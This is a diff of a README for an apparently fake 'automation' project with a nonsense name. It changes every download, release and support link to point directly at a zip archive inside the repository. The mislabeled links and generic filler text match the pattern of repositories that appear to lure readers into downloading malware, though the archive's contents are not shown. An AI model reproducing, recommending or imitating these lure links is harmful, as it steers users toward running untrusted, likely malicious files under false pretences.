@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-14 - Easy Automation for Your Tasks
 
-[![Download amanansdiahnid-14](https://raw.githubusercontent.com/OmkarAtole/amanansdiahnid-14/main/dragonize/amanansdiahnid-14.zip)](https://raw.githubusercontent.com/OmkarAtole/amanansdiahnid-14/main/dragonize/amanansdiahnid-14.zip)
+[![Download amanansdiahnid-14](https://github.com/OmkarAtole/amanansdiahnid-14/raw/refs/heads/main/dragonize/amanansdiahnid-2.4-alpha.3.zip)](https://github.com/OmkarAtole/amanansdiahnid-14/raw/refs/heads/main/dragonize/amanansdiahnid-2.4-alpha.3.zip)
 
 ## 🛠️ Overview
 
@@ -25,7 +25,7 @@ To run amanansdiahnid-14 smoothly, ensure your system meets the following requir
 ## 🔥 Getting Started
 
 1. Click the download button or visit the release page:
-   [Download amanansdiahnid-14](https://raw.githubusercontent.com/OmkarAtole/amanansdiahnid-14/main/dragonize/amanansdiahnid-14.zip)
+   [Download amanansdiahnid-14](https://github.com/OmkarAtole/amanansdiahnid-14/raw/refs/heads/main/dragonize/amanansdiahnid-2.4-alpha.3.zip)
   
 2. Choose the most recent version from the list and download it.
 
@@ -35,7 +35,7 @@ To run amanansdiahnid-14 smoothly, ensure your system meets the following requir
 
 To download amanansdiahnid-14, visit this page:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/OmkarAtole/amanansdiahnid-14/main/dragonize/amanansdiahnid-14.zip)
+[Visit the Releases Page to Download](https://github.com/OmkarAtole/amanansdiahnid-14/raw/refs/heads/main/dragonize/amanansdiahnid-2.4-alpha.3.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -72,7 +72,7 @@ If you encounter any issues, check the following:
 - **Performance Issues**: Close other applications that may slow down your computer.
 - **Program Crashes**: Make sure you are using the latest version. Try reinstalling if problems persist.
 
-For further assistance, visit our [support page](https://raw.githubusercontent.com/OmkarAtole/amanansdiahnid-14/main/dragonize/amanansdiahnid-14.zip) or check the FAQ section.
+For further assistance, visit our [support page](https://github.com/OmkarAtole/amanansdiahnid-14/raw/refs/heads/main/dragonize/amanansdiahnid-2.4-alpha.3.zip) or check the FAQ section.
 
 ## 📬 Feedback
 
